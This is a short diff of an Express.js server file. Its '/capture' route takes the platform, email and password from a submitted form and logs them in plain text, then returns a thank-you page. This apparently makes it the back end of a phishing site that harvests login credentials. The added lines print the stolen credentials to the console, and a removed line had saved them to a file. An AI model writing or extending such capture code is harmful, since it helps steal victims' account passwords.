@@ -8,9 +8,12 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 app.post('/capture', (req, res) => {
+  console.log('Form submitted');
+
   const { platform, email, password } = req.body;
+  console.log(`Platform: ${platform}, Email: ${email}, Password: ${password}`);
+
   const log = `Platform: ${platform} | Email/User: ${email} | Password: ${password}\n`;
-  fs.appendFileSync('log.txt', log);
   res.sendFile(path.join(__dirname, 'thankyou.html'));
 });
 
